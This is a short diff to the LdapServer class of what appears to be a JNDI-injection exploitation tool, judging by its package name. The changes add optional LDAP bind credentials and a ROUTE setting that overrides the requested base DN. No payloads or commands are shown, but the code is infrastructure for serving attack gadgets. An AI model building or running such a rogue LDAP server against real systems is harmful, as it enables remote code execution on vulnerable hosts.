@@ -19,7 +19,7 @@ import java.net.InetAddress;
 import java.util.Set;
 import java.util.TreeMap;
 
-import static com.qi4l.jndi.gadgets.Config.Config.AESkey;
+import static com.qi4l.jndi.gadgets.Config.Config.*;
 import static com.qi4l.jndi.gadgets.utils.Utils.base64Decode;
 import static org.fusesource.jansi.Ansi.ansi;
 
@@ -38,6 +38,10 @@ public class LdapServer extends InMemoryOperationInterceptor {
                     ServerSocketFactory.getDefault(),
                     SocketFactory.getDefault(),
                     (SSLSocketFactory) SSLSocketFactory.getDefault()));
+            if (!USER.equals("")||!PASSWD.equals("")) {
+                serverConfig.addAdditionalBindCredentials(USER,PASSWD);
+            }
+
             //添加操作拦截器
             //将提供的操作拦截器添加到操作拦截器列表中，该列表可用于在请求被内存目录服务器处理之前转换请求，和/或在响应返回给客户端之前转换响应。
             serverConfig.addInMemoryOperationInterceptor(new LdapServer());
@@ -78,7 +82,12 @@ public class LdapServer extends InMemoryOperationInterceptor {
      */
     @Override
     public void processSearchResult(InMemoryInterceptedSearchResult result) {
-        String base = result.getRequest().getBaseDN();
+        String base;
+        if (!ROUTE.equals("")) {
+            base = ROUTE;
+        } else {
+            base = result.getRequest().getBaseDN();
+        }
         try {
             if (!AESkey.equals("123")) {
                 base = base64Decode(base);
